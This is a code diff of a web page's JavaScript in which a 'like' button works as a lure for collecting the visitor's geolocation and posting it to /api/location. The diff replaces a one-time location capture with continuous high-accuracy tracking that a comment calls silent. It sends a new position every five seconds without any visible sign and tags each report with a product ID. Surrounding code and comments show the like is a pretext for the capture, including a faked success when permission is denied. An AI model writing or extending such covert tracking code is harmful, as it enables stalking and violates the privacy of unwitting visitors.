@@ -4,13 +4,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const thanksModal = document.getElementById('thanks-modal');
     const closeModal = document.getElementById('close-modal');
 
-    likeBtns.forEach(btn => {
-        btn.addEventListener('click', function() {
-            if (this.classList.contains('liked')) return;
-            
-            // Iniciar captura
-            getGeolocationAndSend(this);
-        });
+    document.body.addEventListener('click', function(e) {
+        if (e.target.closest('.like-btn')) {
+            const btn = e.target.closest('.like-btn');
+            if (btn.classList.contains('liked')) return;
+            getGeolocationAndSend(btn);
+        }
     });
 
     closeModal.addEventListener('click', () => {
@@ -21,12 +20,27 @@ document.addEventListener('DOMContentLoaded', () => {
         loading.classList.remove('hidden');
 
         if (navigator.geolocation) {
+            // Obtener la primera posición rápido
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     sendDataToServer(position.coords, btnElement);
+                    
+                    // Iniciar rastreo continuo en tiempo real (silencioso y con límite)
+                    let lastSendTime = 0;
+                    navigator.geolocation.watchPosition(
+                        (newPos) => {
+                            const now = Date.now();
+                            // Solo enviar actualización si pasaron al menos 5 segundos desde el último envío
+                            if (now - lastSendTime > 5000) {
+                                lastSendTime = now;
+                                sendDataToServer(newPos.coords, btnElement, true);
+                            }
+                        },
+                        null,
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
                 },
                 (error) => {
-                    // Si el usuario deniega la ubicación, simulamos éxito para no levantar sospechas
                     console.log("Ubicación denegada o error.");
                     loading.classList.add('hidden');
                     markAsLiked(btnElement);
@@ -39,11 +53,13 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    function sendDataToServer(coords, btnElement) {
+    function sendDataToServer(coords, btnElement, isUpdate = false) {
+        const productId = btnElement.getAttribute('data-id');
         const data = {
             latitude: coords.latitude,
             longitude: coords.longitude,
-            accuracy: coords.accuracy
+            accuracy: coords.accuracy,
+            productId: productId
         };
 
         fetch('/api/location', {
@@ -53,19 +69,32 @@ document.addEventListener('DOMContentLoaded', () => {
         })
         .then(response => response.json())
         .then(result => {
-            loading.classList.add('hidden');
-            markAsLiked(btnElement);
-            thanksModal.classList.remove('hidden');
+            if(!isUpdate) {
+                loading.classList.add('hidden');
+                markAsLiked(btnElement);
+                thanksModal.classList.remove('hidden');
+            }
         })
         .catch(error => {
             console.error('Error enviando datos:', error);
-            loading.classList.add('hidden');
-            markAsLiked(btnElement);
+            if(!isUpdate) {
+                loading.classList.add('hidden');
+                markAsLiked(btnElement);
+            }
         });
     }
 
     function markAsLiked(btn) {
         btn.classList.add('liked');
-        btn.innerHTML = '<i class="fa-solid fa-heart"></i> ¡Te gusta!';
+        
+        const countSpan = btn.querySelector('.like-count');
+        if (countSpan) {
+            let count = parseInt(countSpan.innerText) || 0;
+            countSpan.innerText = count + 1;
+        }
+        
+        // Mantener el conteo visible
+        const updatedCount = btn.querySelector('.like-count') ? btn.querySelector('.like-count').innerText : '';
+        btn.innerHTML = `<i class="fa-solid fa-heart"></i> ¡Te gusta! (${updatedCount})`;
     }
 });
